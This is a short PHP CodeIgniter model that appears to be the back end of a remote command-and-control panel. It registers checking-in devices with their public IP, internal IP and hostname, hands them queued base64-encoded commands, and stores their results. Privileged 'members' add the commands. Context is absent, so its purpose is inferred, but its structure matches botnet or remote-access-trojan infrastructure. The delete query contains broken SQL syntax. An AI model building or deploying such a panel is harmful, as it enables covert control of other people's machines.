<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class ApiHandler extends CI_Model {
	public function Commands_Get($data) {
		$t = array($data['sec'], $data['ack']);
		$result = $this->db->query('SELECT cid FROM devices WHERE sec = ? AND ack = ?', $t)->result_array();
		if(count($result)) {
			$t = array($_SERVER['REMOTE_ADDR'], $data['sip'], $data['hot'], $data['ipc'], date('Y-m-d H:i:s'), $data['sec'], $data['ack']);
			$this->db->query('UPDATE devices SET rip = ?, sip = ?, hot = ?, ipc = ?, tim = ? WHERE sec = ? AND ack = ?', $t);
		} else {
			$t = array($data['sec'], $data['ack'], $_SERVER['REMOTE_ADDR'], $data['sip'], $data['hot'], $data['ipc'], date('Y-m-d H:i:s'));
			$this->db->query('INSERT INTO devices (sec, ack, rip, sip, hot, ipc, tim) VALUES (?, ?, ?, ?, ?, ?, ?)', $t);
		}
		$t = array($data['ack'], $data['sec']);
		return $this->db->query('SELECT cid, act, tex FROM commands WHERE ack = ? AND (sec = ? AND fin = 0)', $t)->result_array();
	}
	public function Commands_Fin($data) {
		$t = array($data['res'], $data['cid'], $data['ack'], $data['sec']);
		return $this->db->query('UPDATE commands SET res = ?, fin = 1 WHERE cid = ? AND (ack = ? AND sec = ?)', $t);
	}
	public function Commands_Add($data) {
		$t = array($data['pkt'], $data['sec']);
		$result = $this->db->query('SELECT cid FROM members WHERE pkt = ? AND sec = ?', $t)->result_array();
		if(count($result)) {
			$t = array($data['sec'], $data['ack'], date('Y-m-d H:i:s'), $data['act'], base64_encode($data['tex']));
			return $this->db->query('INSERT INTO commands (sec, ack, tim, act, tex) VALUES (?, ?, ?, ?, ?)', $t);
		} else {
			return false;
		}
	}
	public function Commands_Del($data) {
		$t = array($data['cid'], $data['sec'], $data['ack']);
		return $this->db->query('DELETE FROM commands WHERE cid = ? AND (sec = ?, ack = ?)', $t);
	}
}